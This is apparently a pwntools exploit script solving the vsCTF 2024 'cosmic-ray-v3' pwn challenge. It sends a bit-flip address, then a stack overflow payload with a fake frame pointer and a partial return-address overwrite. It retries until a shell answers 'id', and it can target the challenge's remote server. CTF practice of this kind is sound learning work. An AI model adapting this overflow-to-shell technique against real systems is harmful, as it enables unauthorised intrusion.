#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-archive/vsCTF 2024/pwn/cosmic-ray-v3/cosmicrayv3')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    r.sendlineafter(b':\n', b'0x4015e5')
    r.sendlineafter(b':\n', b'6')
    r.sendafter(b'\n\n', cyclic(0x2e) + p64(elf.bss() + 0x80) + b'\x43\xbd\xce')
    return

while True:
    if __name__ == '__main__':
        if len(sys.argv) == 2 and sys.argv[1] == 'remote':
            REMOTE = True
            r = remote('vsc.tf', 7000)
        else:
            REMOTE = False
            r = process([TARGET,])

    try:
        exploit(r)
        sleep(0.5)
        r.sendline(b'id')

        if b'uid' in r.recv():
            r.interactive()
            exit(0)

        r.close()
    except:
        r.close()